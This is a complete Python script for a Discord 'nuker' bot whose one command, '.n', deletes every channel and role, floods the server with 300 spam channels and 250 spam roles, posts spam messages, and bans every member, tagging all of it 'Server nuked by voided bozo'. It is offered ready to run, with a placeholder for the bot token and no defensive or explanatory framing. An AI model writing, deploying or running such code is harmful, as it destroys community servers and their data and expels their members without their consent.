import discord
from discord.ext import commands

# Define the bot's intents
intents = discord.Intents.all()

# Create a new bot instance with the defined intents
bot = commands.Bot(command_prefix='.', intents=intents)

# Command to nuke the server
@bot.command()
@commands.has_permissions(administrator=True)
async def n(ctx):
    # Delete all channels
    for channel in ctx.guild.channels:
        await channel.delete(reason="Server nuked by voided bozo")
    
    # Create 300 new channels with the name "got nuked by voided bozo"
    for i in range(300):
        await ctx.guild.create_text_channel(name="got nuked by voided bozo")

    # Send messages to each new channel
    for channel in ctx.guild.channels:
        await channel.send(content="Server nuked by voided bozo")

    # Delete all roles
    for role in ctx.guild.roles:
        await role.delete(reason="Server nuked by voided bozo")

    # Create 250 new roles with the name "got nuked by voided bozo"
    for i in range(250):
        await ctx.guild.create_role(name="got nuked by voided bozo")

    # Ban all members
    for member in ctx.guild.members:
        await member.ban(reason="Server nuked by voided bozo")

# Run the bot with the token
bot.run("YOUR_TOKEN_HERE")
